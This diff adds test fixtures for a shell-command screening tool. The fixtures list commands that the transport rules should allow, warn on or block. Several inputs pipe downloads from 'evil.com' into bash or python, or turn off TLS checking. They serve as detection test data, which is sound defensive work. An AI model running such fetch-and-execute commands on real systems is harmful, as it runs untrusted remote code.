@@ -1,0 +1,201 @@
+# Transport rule fixtures
+
+[[fixture]]
+name = "plain_http_to_curl"
+min_milestone = 1
+input = "curl http://example.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink"]
+
+[[fixture]]
+name = "https_to_curl_ok"
+min_milestone = 1
+input = "curl https://example.com/install.sh"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "shortened_url_bitly"
+min_milestone = 1
+input = "curl https://bit.ly/3abc123"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["shortened_url"]
+
+[[fixture]]
+name = "shortened_url_tco"
+min_milestone = 1
+input = "wget https://t.co/abc123"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["shortened_url"]
+
+[[fixture]]
+name = "shortened_url_tinyurl"
+min_milestone = 1
+input = "curl https://tinyurl.com/abc"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["shortened_url"]
+
+[[fixture]]
+name = "shortened_url_isgd"
+min_milestone = 1
+input = "curl https://is.gd/abc"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["shortened_url"]
+
+[[fixture]]
+name = "insecure_flag_k"
+min_milestone = 1
+input = "curl -k https://example.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["insecure_tls_flags"]
+
+[[fixture]]
+name = "insecure_flag_long"
+min_milestone = 1
+input = "curl --insecure https://example.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["insecure_tls_flags"]
+
+[[fixture]]
+name = "curl_bundled_insecure_short_flag"
+min_milestone = 1
+input = "curl -skL https://example.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["insecure_tls_flags"]
+
+[[fixture]]
+name = "wget_no_check_cert"
+min_milestone = 1
+input = "wget --no-check-certificate https://example.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["insecure_tls_flags"]
+
+[[fixture]]
+name = "plain_http_wget_pipe"
+min_milestone = 1
+input = "wget -qO- http://evil.com/payload | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink"]
+
+[[fixture]]
+name = "https_normal_wget"
+min_milestone = 1
+input = "wget https://example.com/file.tar.gz"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "http_not_in_sink"
+min_milestone = 1
+input = "echo http://example.com"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "schemeless_to_sink"
+min_milestone = 1
+input = "curl example.com/install.sh"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["schemeless_to_sink"]
+
+[[fixture]]
+name = "shortened_url_vgd"
+min_milestone = 1
+input = "curl https://v.gd/abc"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["shortened_url"]
+
+[[fixture]]
+name = "http_to_non_sink"
+min_milestone = 1
+input = "echo 'Visit http://example.com for more info'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "insecure_flag_in_non_source"
+min_milestone = 1
+input = "myapp --insecure"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "plain_http_to_python"
+min_milestone = 1
+input = "curl http://evil.com/script.py | python"
+context = "exec"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink"]
+
+[[fixture]]
+name = "plain_http_standalone_curl"
+min_milestone = 1
+input = "curl http://evil.com/script.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink"]
+
+[[fixture]]
+name = "normal_ftp_url"
+min_milestone = 1
+input = "curl ftp://ftp.example.com/file.tar.gz"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "git_clone_schemeless_url"
+min_milestone = 1
+input = "git clone evil.com/repo"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["schemeless_to_sink"]
+
+[[fixture]]
+name = "git_add_filenames_no_false_positive"
+min_milestone = 1
+input = "git add .gitignore bun.lock yarn.lock .env.example"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "schemeless_cred_url"
+min_milestone = 1
+input = "curl admin:pw@evil.com/payload"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["schemeless_to_sink"]
+
+[[fixture]]
+name = "plain_http_localhost_is_loopback"
+min_milestone = 1
+input = "curl http://localhost:3000/api/health"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "plain_http_127_is_loopback"
+min_milestone = 1
+input = "curl http://127.0.0.1:8080/test"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
